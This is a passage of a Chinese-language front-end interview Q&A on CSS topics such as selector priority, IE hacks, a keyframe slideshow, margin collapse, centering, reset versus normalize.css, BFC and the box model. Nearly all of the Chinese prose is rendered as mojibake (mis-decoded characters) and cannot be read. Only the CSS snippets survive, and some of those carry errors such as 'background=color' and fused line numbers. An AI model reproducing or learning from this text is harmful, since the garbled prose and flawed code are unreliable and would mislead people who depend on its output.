ç¾Žå…ƒï¼‰ï¼Œä½†æ˜¯å¥½æ¶ˆæ¯æ˜¯ï¼ˆè‡³å°‘åˆ°ç›®å‰ä¸ºæ­¢ï¼‰æœ€å¤§çš„æœç´¢å¼•æ“Ž Google ç›®å‰è¿˜æ˜¯å…è´¹ï¼Œè€Œä¸”å®ƒä¸»å®°ç€ 60ï¼…ä»¥ä¸Šçš„æœç´¢å¸‚åœºã€‚ é“¾æŽ¥äº¤æ¢å’Œé“¾æŽ¥å¹¿æ³›åº¦ï¼ˆLink Popularityï¼‰ç½‘é¡µå†…å®¹éƒ½æ˜¯ä»¥è¶…æ–‡æœ¬ï¼ˆHypertextï¼‰çš„æ–¹å¼æ¥äº’ç›¸é“¾æŽ¥çš„ï¼Œç½‘ç«™ä¹‹é—´ä¹Ÿæ˜¯å¦‚æ­¤ã€‚é™¤äº†æœç´¢å¼•æ“Žä»¥å¤–ï¼Œäººä»¬ä¹Ÿæ¯å¤©é€šè¿‡ä¸åŒç½‘ç«™ä¹‹é—´çš„é“¾æŽ¥æ¥ Surfingï¼ˆâ€œå†²æµªâ€ï¼‰ã€‚å…¶å®ƒç½‘ç«™åˆ°ä½ çš„ç½‘ç«™çš„é“¾æŽ¥è¶Šå¤šï¼Œä½ ä¹Ÿå°±ä¼šèŽ·å¾—æ›´å¤šçš„è®¿é—®é‡ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œä½ çš„ç½‘ç«™çš„å¤–éƒ¨é“¾æŽ¥æ•°è¶Šå¤šï¼Œä¼šè¢«æœç´¢å¼•æ“Žè®¤ä¸ºå®ƒçš„é‡è¦æ€§è¶Šå¤§ï¼Œä»Žè€Œç»™ä½ æ›´é«˜çš„æŽ’åã€‚ æœ‰å“ªé¡¹æ–¹å¼å¯ä»¥å¯¹ä¸€ä¸ª DOM è®¾ç½®å®ƒçš„ CSS æ ·å¼å¤–éƒ¨æ ·å¼è¡¨ï¼Œå¼•å…¥ä¸€ä¸ª å¤–éƒ¨ css æ–‡ä»¶ å†…éƒ¨æ ·å¼è¡¨ï¼Œå°† css ä»£ç ç›´æŽ¥åœ¨æ”¾åœ¨ &lt;head&gt; æ ‡ç­¾å†…éƒ¨ å†…è”æ ·å¼ï¼Œå°† css æ ·å¼ ç›´æŽ¥å®šä¹‰åœ¨ HTML å…ƒç´ å†…éƒ¨ CSSéƒ½æœ‰å“ªäº›é€‰æ‹©å™¨æ´¾ç”Ÿé€‰æ‹©å™¨ï¼ˆç”¨ HTML æ ‡ç­¾ç”³æ˜Žï¼‰ id é€‰æ‹©å™¨ï¼ˆç”¨ DOM çš„ ID ç”³æ˜Žï¼‰ ç±»é€‰æ‹©å™¨ï¼ˆç”¨ä¸€ä¸ªæ ·å¼ç±»åç”³æ˜Žï¼‰ å±žæ€§é€‰æ‹©å™¨ï¼ˆç”¨ DOM çš„å±žæ€§ç”³æ˜Žï¼Œå±žäºŽ CSS2ï¼ŒIE6 ä¸æ”¯æŒï¼Œä¸å¸¸ç”¨ï¼Œä¸çŸ¥é“å°±ç®—äº†ï¼‰ é™¤äº†å‰ 3 ç§åŸºæœ¬é€‰æ‹©å™¨ï¼Œè¿˜æœ‰ä¸€äº›æ‰©å±•é€‰æ‹©å™¨ï¼ŒåŒ…æ‹¬ åŽä»£é€‰æ‹©å™¨ï¼ˆåˆ©ç”¨ç©ºæ ¼é—´éš”ï¼Œæ¯”å¦‚ div .a{ }ï¼‰ ç¾¤ç»„é€‰æ‹©å™¨ï¼ˆåˆ©ç”¨é€—å·é—´éš”ï¼Œæ¯”å¦‚ p,div,#a{ }ï¼‰ CSS é€‰æ‹©å™¨çš„ä¼˜å…ˆçº§æ˜¯æ€Žä¹ˆæ ·å®šä¹‰çš„ï¼ŸåŸºæœ¬åŽŸåˆ™ï¼š ä¸€èˆ¬è€Œè¨€ï¼Œé€‰æ‹©å™¨è¶Šç‰¹æ®Šï¼Œå®ƒçš„ä¼˜å…ˆçº§è¶Šé«˜ã€‚ä¹Ÿå°±æ˜¯é€‰æ‹©å™¨æŒ‡å‘çš„è¶Šå‡†ç¡®ï¼Œå®ƒçš„ä¼˜å…ˆçº§å°±è¶Šé«˜ã€‚ important &gt; å†…è” &gt; ID &gt; ç±» &gt; æ ‡ç­¾ | ä¼ªç±» | å±žæ€§é€‰æ‹© &gt; ä¼ªå¯¹è±¡ &gt; é€šé…ç¬¦ &gt; ç»§æ‰¿ å¤æ‚çš„è®¡ç®—æ–¹æ³•ï¼šç”¨ 1 è¡¨ç¤ºæ´¾ç”Ÿé€‰æ‹©å™¨çš„ä¼˜å…ˆçº§ ç”¨ 10 è¡¨ç¤ºç±»é€‰æ‹©å™¨çš„ä¼˜å…ˆçº§ ç”¨ 100 æ ‡ç¤º ID é€‰æ‹©å™¨çš„ä¼˜å…ˆçº§ div.test1 .span var ä¼˜å…ˆçº§ 1+10 +10 +1 span#xxx .songs li ä¼˜å…ˆçº§ 1+100 + 10 + 1 #xxx li ä¼˜å…ˆçº§ 100 +1 CSS ä¸­å¯ä»¥é€šè¿‡å“ªäº›å±žæ€§å®šä¹‰ï¼Œä½¿å¾—ä¸€ä¸ªDOM å…ƒç´ ä¸æ˜¾ç¤ºåœ¨æµè§ˆå™¨å¯è§†èŒƒå›´å†…ï¼Ÿæœ€åŸºæœ¬çš„ï¼šè®¾ç½® display å±žæ€§ä¸º noneï¼Œæˆ–è€…è®¾ç½® visibility å±žæ€§ä¸º hidden æŠ€å·§æ€§ï¼šè®¾ç½®å®½é«˜ä¸º 0ï¼Œè®¾ç½®é€æ˜Žåº¦ä¸º 0ï¼Œè®¾ç½® z-index ä½ç½®åœ¨-1000 è¶…é“¾æŽ¥è®¿é—®è¿‡åŽ hover æ ·å¼å°±ä¸å‡ºçŽ°çš„é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿè¢«ç‚¹å‡»è®¿é—®è¿‡çš„è¶…é“¾æŽ¥æ ·å¼ä¸åœ¨å…·æœ‰ hover å’Œ active äº†,è§£å†³æ–¹æ³•æ˜¯æ”¹å˜ CSS å±žæ€§çš„æŽ’åˆ—é¡ºåº: L-V-H-Aï¼ˆlink,visited,hover,activeï¼‰ ä»€ä¹ˆæ˜¯ CSS hack? ie6,7,8 çš„ hack åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿé’ˆå¯¹ä¸åŒæµè§ˆå™¨å†™ä¸åŒçš„ CSS code çš„è¿‡ç¨‹å°±æ˜¯ CSS hackã€‚ 123456789101112#test&#123; width:300px; height:300px; background-color:blue; /*firefox*/ background-color:red\9; /*all ie*/ background-color:yellow; /*ie8*/ +background-color:pink; /*ie7*/ _background-color:orange; /*ie6*/ &#125;:root #test &#123; background-color:purple\9; &#125; /*ie9*/@media all and (min-width:0px)&#123; #test &#123; background=color:blackï¼› &#125;&#125; /*opera*/@media screen and (-webkit-min-device-pixel-ratio:0)&#123; #test &#123; background-color: gray; &#125;&#125; /*Chrome and safari*/ è¯·ç”¨ css å†™ä¸€ä¸ªç®€å•çš„å¹»ç¯ç‰‡æ•ˆæžœé¡µé¢12345678910111213141516171819202122232425.ani&#123; width: 480px; height: 320px; margin: 50px auto; overflow: hidden; box-shadow: 0 0 5px rgba(0,0,0,1); background-size: cover; background-position: center; -webkit-animation-name:"loops"; -webkit-animation-duration:20s; -webkit-animation-iteration-count:infinite;&#125;@-webkit-keyframes "loops" &#123; 0%&#123; background:url(http://d.hiphotos.baidu.com/image/w%3D400/sign=c01e6adca964034f0fcdc3069fc27980/e824b899a9014c08e5e38ca4087b02087af4f4d3.jpg) no-repeat; &#125; 25%&#123; background:url(http://b.hiphotos.baidu.com/image/w%3D400/sign=edee1572e9f81a4c2632edc9e72b6029/30adcbef76094b364d72bceba1cc7cd98c109dd0.jpg) no-repeat; &#125; 50%&#123; background:url(http://b.hiphotos.baidu.com/image/w%3D400/sign=937dace2552c11dfded1be2353266255/d8f9d72a6059252d258e7605369b033b5bb5b912.jpg) no-repeat; &#125; 75%&#123; background:url(http://g.hiphotos.baidu.com/image/w%3D400/sign=7d37500b8544ebf86d71653fe9f9d736/0df431adcbef76095d61f0972cdda3cc7cd99e4b.jpg) no-repeat; &#125; 100%&#123; background:url(http://c.hiphotos.baidu.com/image/w%3D400/sign=cfb239ceb0fb43161a1f7b7a10a54642/3b87e950352ac65ce2e73f76f9f2b21192138ad1.jpg) no-repeat; &#125;&#125; å…·ä½“ä»£ç ç‚¹å‡»è¿™é‡Œ å¦å¤–ä¸€ä¸ªä¾‹å­ï¼ˆé€šè¿‡é€æ˜Žåº¦å®žçŽ°ï¼‰ è¡Œå†…å…ƒç´ å’Œå—çº§å…ƒç´ çš„å…·ä½“åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿè¡Œå†…å…ƒç´ çš„ padding å’Œ margin å¯è®¾ç½®å—ï¼Ÿå—çº§å…ƒç´ ï¼ˆblockï¼‰ç‰¹æ€§ï¼š æ€»æ˜¯ç‹¬å ä¸€è¡Œï¼Œè¡¨çŽ°ä¸ºå¦èµ·ä¸€è¡Œï¼Œè€Œä¸”å…¶åŽçš„å…ƒç´ ä¹Ÿå¿…é¡»å¦èµ·ä¸€è¡Œæ˜¾ç¤º; å®½åº¦ï¼ˆwidthï¼‰ã€é«˜åº¦ï¼ˆheightï¼‰ã€å†…è¾¹è·ï¼ˆpaddingï¼‰å’Œå¤–è¾¹è·ï¼ˆmarginï¼‰éƒ½å¯ä»¥æŽ§åˆ¶ å†…è”å…ƒç´ ï¼ˆinlineï¼‰ç‰¹æ€§ï¼š å’Œç›¸é‚»çš„å†…è”å…ƒç´ åœ¨åŒä¸€è¡Œï¼š å®½åº¦(width)ã€é«˜åº¦(height)ã€å†…è¾¹è·çš„ top/bottom(padding-top/padding-bottom)å’Œå¤–è¾¹è·çš„ top/bottom(margin-top/margin-bottom)éƒ½ä¸å¯æ”¹å˜ï¼ˆä¹Ÿå°±æ˜¯ padding å’Œ margin çš„left å’Œ right æ˜¯å¯ä»¥è®¾ç½®çš„ï¼‰ï¼Œå°±æ˜¯é‡Œé¢æ–‡å­—æˆ–å›¾ç‰‡çš„å¤§å°ã€‚ æµè§ˆå™¨è¿˜æœ‰é»˜è®¤çš„å¤©ç”Ÿ inline-block å…ƒç´ ï¼ˆæ‹¥æœ‰å†…åœ¨å°ºå¯¸ï¼Œå¯è®¾ç½®é«˜å®½ï¼Œä½†ä¸ä¼šè‡ªåŠ¨æ¢è¡Œï¼‰ï¼Œæœ‰å“ªäº›ï¼Ÿ1&lt;input&gt; ã€&lt;img&gt; ã€&lt;button&gt; ã€&lt;texterea&gt; ã€&lt;label&gt;ã€‚ ä»€ä¹ˆæ˜¯å¤–è¾¹è·é‡å ï¼Ÿé‡å çš„ç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿå¤–è¾¹è·é‡å å°±æ˜¯ margin-collapse åœ¨ CSS å½“ä¸­ï¼Œç›¸é‚»çš„ä¸¤ä¸ªç›’å­ï¼ˆå¯èƒ½æ˜¯å…„å¼Ÿå…³ç³»ä¹Ÿå¯èƒ½æ˜¯ç¥–å…ˆå…³ç³»ï¼‰çš„å¤–è¾¹è·å¯ä»¥ç»“åˆæˆä¸€ä¸ªå•ç‹¬çš„å¤–è¾¹è·ã€‚è¿™ç§åˆå¹¶è¾¹è·çš„æ–¹å¼è¢«ç§°ä¸ºæŠ˜å ï¼Œå¹¶ä¸”å› è€Œæ‰€é›†åˆçš„å¤–è¾¹è·ç§°ä¸ºæŠ˜å å¤–è¾¹è· æŠ˜å ç»“æž„éµå¾ªä¸‹åˆ—è®¡ç®—è§„åˆ™ï¼š ä¸¤ä¸ªç›¸é‚»çš„å¤–è¾¹è·éƒ½æ˜¯æ­£æ•°æ—¶ï¼ŒæŠ˜å ç»“æžœæ˜¯å®ƒä»¬ä¸¤è€…ä¹‹é—´è¾ƒå¤§çš„å€¼ã€‚ ä¸¤ä¸ªç›¸é‚»çš„å¤–è¾¹è·éƒ½æ˜¯è´Ÿæ•°æ—¶ï¼ŒæŠ˜å ç»“æžœæ˜¯ä¸¤è€…ç»å¯¹å€¼çš„è¾ƒå¤§å€¼ ä¸¤ä¸ªå¤–è¾¹è·ä¸€æ­£ä¸€è´Ÿï¼ŒæŠ˜å ç»“æžœæ˜¯ä¸¤è€…çš„ç›¸åŠ çš„å’Œã€‚ rgba() å’Œ opacity çš„é€æ˜Žæ•ˆæžœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿrgba() å’Œ opacity éƒ½èƒ½å®žçŽ°é€æ˜Žæ•ˆæžœï¼Œä½†æ˜¯æœ€å¤§çš„ä¸åŒæ˜¯ opacity ä½œç”¨äºŽå…ƒç´ ï¼Œä»¥åŠå…ƒç´ å†…çš„æ‰€æœ‰å†…å®¹çš„é€æ˜Žåº¦ã€‚ è€Œ rgba() åªä½œç”¨äºŽå…ƒç´ çš„é¢œè‰²å’Œå…¶èƒŒæ™¯è‰²ã€‚ï¼ˆè®¾ç½® rgbaé€æ˜Žçš„å…ƒç´ çš„å­å…ƒç´ ä¸ä¼šç»§æ‰¿é€æ˜Žæ•ˆæžœï¼ï¼‰ css ä¸­å¯ä»¥è®©æ–‡å­—åž‚ç›´å’Œæ°´å¹³æ–¹å‘ä¸Šé‡å çš„ä¸¤ä¸ªå±žæ€§æ˜¯ä»€ä¹ˆï¼Ÿåž‚ç›´æ–¹å‘ï¼šline-height æ°´å¹³æ–¹å‘ï¼šletter-spacing letter-spacing çš„å¦™ç”¨ï¼šå¯ä»¥ç”¨äºŽæ¶ˆé™¤ Inline-block å…ƒç´ é—´çš„æ¢è¡Œç¬¦ç©ºæ ¼é—´éš™é—®é¢˜ å¦‚ä½•åž‚ç›´å±…ä¸­ä¸€ä¸ªæµ®åŠ¨å…ƒç´ 123456789101112131415161718192021222324252627282930/* å·²çŸ¥å…ƒç´ å®½é«˜ */#target&#123; background-color: #6699FF; width: 200px; height: 200px; position: absolute; /*çˆ¶å…ƒç´ éœ€è¦ç›¸å¯¹å®šä½*/ top: 50%; left: 50%; /* äºŒåˆ†ä¹‹ä¸€çš„ heightï¼Œwidth*/ margin-top: -100px; margin-left: -100px;&#125;/* æœªçŸ¥å…ƒç´ å®½é«˜ */#target&#123; background-color: #6699FF; width: 200px; height: 200px; margin: auto; position: absolute; /*çˆ¶å…ƒç´ éœ€è¦ç›¸å¯¹å®šä½*/ left: 0; top: 0; right: 0; bottom: 0;&#125;/* åž‚ç›´å±…ä¸­ä¸€ä¸ª&lt;img&gt; */#container&#123; display: table-cell; text-align: center; vertical-align: middle;&#125; px å’Œ å’Œ em çš„åŒºåˆ«ã€‚px å’Œ em éƒ½æ˜¯é•¿åº¦å•ä½ï¼ŒåŒºåˆ«æ˜¯ï¼Œpx çš„å€¼æ˜¯å›ºå®šçš„ï¼ŒæŒ‡å®šæ˜¯å¤šå°‘å°±æ˜¯å¤šå°‘ï¼Œè®¡ç®—æ¯”è¾ƒå®¹æ˜“ï¼Œemçš„å€¼ä¼šç»§æ‰¿çˆ¶çº§å…ƒç´ çš„å¤§å° æµè§ˆå™¨çš„é»˜è®¤å­—ä½“éƒ½æ˜¯16px æ‰€ä»¥æœªç»è°ƒæ•´çš„æµè§ˆå™¨éƒ½ç¬¦åˆ 1em = 16px ï¼Œ12px = 0.75em 10px = 0.625em æè¿°ä¸€ä¸ª â€ reset â€çš„ çš„ CSS æ–‡ä»¶å¹¶å¦‚ä½•ä½¿ç”¨å®ƒ ã€‚ çŸ¥é“ normalize.css å—ï¼Ÿä½ äº†è§£ä»–ä»¬çš„ä¸åŒä¹‹å¤„ï¼Ÿé‡ç½®æ ·å¼éžå¸¸å¤šï¼Œå‡¡æ˜¯ä¸€ä¸ªå‰ç«¯å¼€å‘äººå‘˜è‚¯å®šæœ‰ä¸€ä¸ªå¸¸ç”¨çš„é‡ç½® CSS æ–‡ä»¶å¹¶çŸ¥é“å¦‚ä½•ä½¿ç”¨å®ƒä»¬ã€‚ä»–ä»¬æ˜¯ç›²ç›®çš„åœ¨åšè¿˜æ˜¯çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆåšå‘¢ï¼ŸåŽŸå› æ˜¯ä¸åŒçš„æµè§ˆå™¨å¯¹ä¸€äº›å…ƒç´ æœ‰ä¸åŒçš„é»˜è®¤æ ·å¼ï¼Œå¦‚æžœä½ ä¸å¤„ç†ï¼Œåœ¨ä¸åŒçš„æµè§ˆå™¨ä¸‹ä¼šå­˜åœ¨å¿…è¦çš„é£Žé™©ï¼Œæˆ–è€…æ›´æœ‰æˆå‰§æ€§çš„æ€§å‘ç”Ÿã€‚ ä½ å¯èƒ½ä¼šç”¨ Normalize æ¥ä»£æ›¿ä½ çš„é‡ç½®æ ·å¼æ–‡ä»¶ã€‚å®ƒæ²¡æœ‰é‡ç½®æ‰€æœ‰çš„æ ·å¼é£Žæ ¼ï¼Œä½†ä»…æä¾›äº†ä¸€å¥—åˆç†çš„é»˜è®¤æ ·å¼å€¼ã€‚æ—¢èƒ½è®©ä¼—å¤šæµè§ˆå™¨è¾¾åˆ°ä¸€è‡´å’Œåˆç†ï¼Œä½†åˆä¸æ‰°ä¹±å…¶ä»–çš„ä¸œè¥¿ï¼ˆå¦‚ç²—ä½“çš„æ ‡é¢˜ï¼‰ã€‚ åœ¨è¿™ä¸€æ–¹é¢ï¼Œæ— æ³•åšæ¯ä¸€ä¸ªå¤ä½é‡ç½®ã€‚å®ƒä¹Ÿç¡®å®žæœ‰äº›è¶…è¿‡ä¸€ä¸ªé‡ç½®ï¼Œå®ƒå¤„ç†äº†ä½ æ°¸è¿œéƒ½ä¸ç”¨è€ƒè™‘çš„æ€ªç™–ï¼Œåƒ HTML çš„ audio å…ƒç´ ä¸ä¸€è‡´æˆ– line-height ä¸ä¸€è‡´ã€‚ Resetæ ·å¼çš„ç›®çš„å°±æ˜¯æ¸…é™¤æŸäº›æµè§ˆå™¨çš„é»˜è®¤æ ·å¼,æ–¹ä¾¿cssçš„ä¹¦å†™ï¼šä¾‹å¦‚ï¼š*{margin:0;padding:0;list-style:none;} normalizeçš„ç†å¿µä¸Žresetçš„ä¸åŒï¼Œä»–å¹¶ä¸æ˜¯æ¸…é™¤æµè§ˆå™¨çš„é»˜è®¤æ ·å¼ï¼Œè€Œæ˜¯å°½é‡å°†æ‰€æœ‰çš„æµè§ˆå™¨çš„é»˜è®¤æ ·å¼ç»Ÿä¸€ã€‚ Sassã€Less æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦ç”¨ï¼ŸCSS é¢„å¤„ç†å™¨ï¼Œæ˜¯CSS çš„ä¸€ç§æŠ½è±¡å±‚ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„è¯­æ³•æˆ–è€…è¯´æ˜¯è¯­è¨€ç¼–è¯‘æˆCSSã€‚ ä¾‹å¦‚ Less æ˜¯ä¸€ç§åŠ¨æ€æ ·å¼è¯­è¨€ï¼Œå°†CSS èµ‹äºˆäº†åŠ¨æ€è¯­è¨€çš„ç‰¹æ€§ï¼Œå¦‚å˜é‡ï¼Œç»§æ‰¿ï¼Œè¿ç®—ï¼Œå‡½æ•°ï¼ŒLess æ—¢å¯ä»¥åœ¨å®¢æˆ·ç«¯ä¸Šè¿è¡Œï¼ˆæ”¯æŒ IE6+,Webkit,Firefox ï¼‰ä¹Ÿå¯ä»¥åœ¨æœåŠ¡ç«¯è¿è¡Œï¼ˆå€ŸåŠ© Node.js ï¼‰ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒä»¬ï¼Ÿ ç»“æž„æ¸…æ™°ï¼Œä¾¿äºŽæ‰©å±•ã€‚ å¯ä»¥æ–¹ä¾¿åœ°å±è”½æµè§ˆå™¨ç§æœ‰è¯­æ³•å·®å¼‚ï¼Œå°è£…å¯¹æµè§ˆå™¨è¯­æ³•å·®å¼‚çš„é‡å¤å¤„ç†ï¼Œå¯ä»¥å‡å°‘æ— æ„ä¹‰çš„æœºæ¢°åŠ³åŠ¨ã€‚ å¯ä»¥è½»æ¾å®žçŽ°å¤šé‡ç»§æ‰¿ã€‚ å¯ä»¥å®Œå…¨å…¼å®¹ CSS ä»£ç ï¼Œå¯ä»¥æ–¹ä¾¿åº”ç”¨åˆ°æ—§é¡¹ç›®ä¸­ã€‚Less åªæ˜¯åœ¨ CSS è¯­æ³•ä¸Šåšäº†æ‰©å±•ï¼Œæ‰€æœ‰è€çš„ CSS ä»£ç ä¹Ÿå¯ä»¥ä¸Ž Less ä»£ç ä¸€èµ·ç¼–è¯‘ã€‚ display:none ä¸Ž visibilityï¼šhidden çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿdisplayï¼šéšè—å¯¹åº”å…ƒç´ ä½†ä¸æŒ¤å è¯¥å…ƒç´ åŽŸæ¥çš„ç©ºé—´ã€‚ visibilityï¼šéšè—å¯¹åº”çš„å…ƒç´ å¹¶ä¸”æŒ¤å è¯¥å…ƒç´ åŽŸæ¥çš„ç©ºé—´ã€‚ å³æ˜¯ï¼Œä½¿ç”¨ CSS displayï¼šnone å±žæ€§åŽï¼ŒHTML å…ƒç´ ï¼ˆå¯¹è±¡ï¼‰çš„å®½é«˜ç­‰å±žæ€§å€¼éƒ½å°†ä¸¢å¤±ï¼Œè€Œä½¿ç”¨ visibilityï¼šhidden å±žæ€§åŽï¼ŒHTML å…ƒç´ ï¼ˆå¯¹è±¡ï¼‰ä»…ä»…æ˜¯åœ¨è§†è§‰ä¸Šçœ‹ä¸è§ï¼ˆå®Œå…¨é€æ˜Žï¼‰ï¼Œè€Œå®ƒå æ®çš„ç©ºé—´ä½ç½®ä»ç„¶æ˜¯å­˜åœ¨çš„ã€‚ CSS ä¸­ link å’Œ @import çš„åŒºåˆ«æ˜¯ï¼šLink å±žäºŽ html æ ‡ç­¾ï¼Œè€Œ @import æ˜¯ CSS ä¸­æä¾›çš„ã€‚ åœ¨é¡µé¢åŠ è½½çš„æ—¶å€™ï¼Œ link ä¼šåŒæ—¶è¢«åŠ è½½ï¼Œè€Œ @import å¼•ç”¨çš„ CSS ä¼šåœ¨é¡µé¢åŠ è½½å®ŒæˆåŽæ‰ä¼šåŠ è½½å¼•ç”¨çš„ CSS @import åªæœ‰åœ¨ ie5 ä»¥ä¸Šæ‰å¯ä»¥è¢«è¯†åˆ«ï¼Œè€Œ link æ˜¯ html æ ‡ç­¾ï¼Œä¸å­˜åœ¨æµè§ˆå™¨å…¼å®¹æ€§é—®é¢˜ Link å¼•å…¥æ ·å¼çš„æƒé‡å¤§äºŽ @import çš„å¼•ç”¨ï¼ˆ@import æ˜¯å°†å¼•ç”¨çš„æ ·å¼å¯¼å…¥åˆ°å½“å‰çš„é¡µé¢ä¸­ï¼‰ ç®€ä»‹ç›’å­æ¨¡åž‹CSS çš„ç›’å­æ¨¡åž‹æœ‰ä¸¤ç§ï¼šIE ç›’å­æ¨¡åž‹ï¼Œæ ‡å‡†çš„ W3C ç›’å­æ¨¡åž‹ ç›’æ¨¡åž‹ï¼šå†…å®¹ã€å†…è¾¹è·ã€å¤–è¾¹è·ï¼ˆä¸€èˆ¬ä¸è®¡å…¥ç›’å­çš„å®žé™…å®½åº¦ï¼‰ã€è¾¹æ¡† ä¸ºä»€ä¹ˆè¦åˆå§‹åŒ–æ ·å¼ï¼Ÿç”±äºŽæµè§ˆå™¨å…¼å®¹çš„é—®é¢˜ï¼Œä¸åŒçš„æµè§ˆå™¨å¯¹æ ‡ç­¾çš„é»˜è®¤æ ·å¼å€¼ä¸åŒï¼Œè‹¥ä¸åˆå§‹åŒ–ä¼šé€ æˆä¸åŒæµè§ˆå™¨ä¹‹é—´çš„å·®å¼‚ ä½†æ˜¯åˆå§‹åŒ– CSS ä¼šå¯¹æœç´¢å¼•æ“Žä¼˜åŒ–é€ æˆå°å½±å“ã€‚ BFC æ˜¯ä»€ä¹ˆï¼ŸBFCï¼ˆå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰ï¼Œä¸€ä¸ªåˆ›å»ºäº†æ–°çš„ BFC çš„ç›’å­æ˜¯ç‹¬ç«‹å¸ƒå±€çš„ï¼Œç›’å­å†…çš„å…ƒç´ çš„å¸ƒå±€ä¸ä¼šå½±å“ç›’å­å¤–é¢çš„å…ƒç´ ï¼Œåœ¨åŒä¸€ä¸ª BFC ä¸­çš„ä¸¤ä¸ªç›¸é‚»çš„ç›’å­åœ¨åž‚ç›´æ–¹å‘å‘ç”Ÿ margin é‡å é—®é¢˜ã€‚ BFC æ˜¯æŒ‡æµè§ˆå™¨ä¸­åˆ›å»ºäº†ä¸€ä¸ªç‹¬ç«‹çš„æ¸²æŸ“åŒºåŸŸï¼Œè¯¥åŒºåŸŸå†…æ‰€æœ‰å…ƒç´ çš„å¸ƒå±€ä¸ä¼šå½±å“åˆ°åŒºåŸŸå¤–è¿œå…ƒç´ çš„å¸ƒå±€ï¼Œè¿™ä¸ªæ¸²æŸ“å…¶åŒºåŸŸåªå¯¹å—çº§å…ƒç´ èµ·ä½œç”¨ã€‚ html è¯­ä¹‰åŒ–æ˜¯ä»€ä¹ˆï¼Ÿå½“é¡µé¢æ ·å¼åŠ è½½å¤±è´¥çš„æ—¶å€™èƒ½å¤Ÿè®©é¡µé¢å‘ˆçŽ°å‡ºæ¸…æ™°çš„ç»“æž„ æœ‰åˆ©äºŽ seo ä¼˜åŒ–ï¼Œåˆ©äºŽè¢«æœç´¢å¼•æ“Žæ”¶å½•ï¼ˆæ›´ä¾¿äºŽæœç´¢å¼•æ“Žçš„çˆ¬è™«ç¨‹åºæ¥è¯†åˆ«ï¼‰ ä¾¿äºŽé¡¹ç›®çš„å¼€å‘ç»´æŠ¤ï¼Œä½¿ html ä»£ç å…·æœ‰å¯è¯»æ€§ï¼Œä¾¿äºŽå…¶ä»–è®¾å¤‡è§£æžã€‚ Doctype çš„ä½œç”¨ï¼Ÿä¸¥æ ¼æ¨¡å¼ä¸Žæ··æ‚æ¨¡å¼çš„åŒºåˆ«ï¼Ÿ&lt;!DOCTYPE&gt; ç”¨äºŽå‘ŠçŸ¥æµè§ˆå™¨è¯¥ä»¥ä½•ç§æ¨¡å¼æ¥æ¸²æŸ“æ–‡æ¡£ ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼šé¡µé¢æŽ’ç‰ˆä»¥åŠ JS è§£æžæ˜¯ä»¥è¯¥æµè§ˆå™¨æ”¯æŒçš„æœ€é«˜æ ‡å‡†æ¥æ‰§è¡Œ æ··æ‚æ¨¡å¼ï¼šä¸ä¸¥æ ¼æŒ‰ç…§æ ‡å‡†æ‰§è¡Œï¼Œä¸»è¦æ˜¯ç”¨æ¥å…¼å®¹æ—§çš„æµè§ˆå™¨ï¼Œå‘åŽå…¼å®¹ IE çš„åŒè¾¹è·BUGï¼šå—çº§å…ƒç´  float åŽè®¾ç½®æ¨ªå‘ margin ï¼Œie6 æ˜¾ç¤ºçš„margin æ¯”è®¾ç½®çš„æ‰“ï¼Œè§£å†³ï¼šåŠ å…¥ _display:inlineHTMLä¸Ž XHTML ä¸¤è€…çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ æ‰€æœ‰çš„æ ‡è®°éƒ½å¿…é¡»è¦æœ‰ä¸€ä¸ªç›¸åº”çš„ç»“æŸæ ‡è®° æ‰€æœ‰æ ‡ç­¾çš„å…ƒç´ å’Œå±žæ€§çš„åå­—éƒ½å¿…é¡»ä½¿ç”¨å°å†™ æ‰€æœ‰ XML æ ‡è®°å¿…é¡»åˆç†åµŒå¥—èµ·æ¥ æ‰€æœ‰å±žæ€§å¿…é¡»ä½¿ç”¨å¼•å· æ‹¬èµ·æ¥ æŠŠæ‰€æœ‰ &lt; å’Œ &amp; ç‰¹æ®Šç¬¦å·ç”¨ç¼–ç è¡¨ç¤º ç»™æ‰€æœ‰å±žæ€§èµ‹ä¸€ä¸ªå€¼ ä¸è¦åœ¨æ³¨é‡Šå†…å®¹ä¸­ä½¿ç”¨ â€œâ€”â€”â€ å›¾ç‰‡å¿…é¡»æœ‰è¯´æ˜Žæ–‡å­— html å¸¸è§çš„å…¼å®¹æ€§é—®é¢˜ï¼Ÿ åŒè¾¹è· bug float å¼•èµ·çš„ï¼Œä½¿ç”¨ display 3åƒç´ é—®é¢˜ï¼Œä½¿ç”¨ float å¼•èµ·çš„ ä½¿ç”¨ display: inline -3px è¶…é“¾æŽ¥ hover ç‚¹å‡»åŽå¤±æ•ˆ ä½¿ç”¨æ­£ç¡®çš„ä¹¦å†™é¡ºåº link visited hover active IE z-index é—®é¢˜ï¼Œç»™çˆ¶çº§æ·»åŠ  positionï¼šrelative Png é€æ˜Žï¼Œä½¿ç”¨ jsä»£ç æ”¹ Min-height æœ€å°é«˜åº¦ !important è§£å†³ select åœ¨ ie6 ä¸‹é®ç›– ä½¿ç”¨ iframe åµŒå¥— ä¸ºä»€ä¹ˆæ²¡æœ‰åŠžæ³•å®šä¹‰ 1px å·¦å³çš„å®½åº¦å®¹å™¨ï¼ˆIE6 é»˜è®¤çš„è¡Œé«˜é€ æˆçš„ï¼Œä½¿ç”¨ over:hidden,zoom:0.08,line-height:1pxï¼‰ IE6 ä¸æ”¯æŒ PNG é€æ˜ŽèƒŒæ™¯ï¼Œè§£å†³æ–¹æ³•ï¼šIE6 ä¸‹ä½¿ç”¨ gif å›¾ç‰‡ IE-5 ä¸æ”¯æŒ opacity ,è§£å†³æ–¹æ³•ï¼š 12345.opacity&#123; opacity:0.4 filter: alpha(opacity = 60) /* for IE5-7 */ -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=60)";/* for IE8 */&#125; å¯¹ WEB æ 